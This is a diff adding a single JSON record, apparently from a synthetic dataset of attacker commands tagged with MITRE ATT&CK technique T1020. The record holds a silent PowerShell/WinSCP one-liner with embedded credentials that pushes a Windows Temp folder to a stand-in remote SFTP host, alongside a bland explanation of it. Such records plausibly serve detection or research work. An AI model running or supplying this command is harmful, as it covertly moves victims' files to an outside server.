@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/mirror/temp/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.50/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"synchronize remote C:\\Windows\\Temp `\"$r`\" -criteria=time -delete\") 'exit' | Out-Null 2>$null",
+  "explanation": "Mirrors the local Temp directory to a remote SFTP location automatically, pushing only changed files and removing remote files no longer present locally.",
+  "rationale_steps": [
+    "Define local and remote sync targets",
+    "Establish SFTP connection in batch mode",
+    "Synchronize in 'remote' mode based on timestamps",
+    "Avoid interactive prompts and silence output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-ce7b3733",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
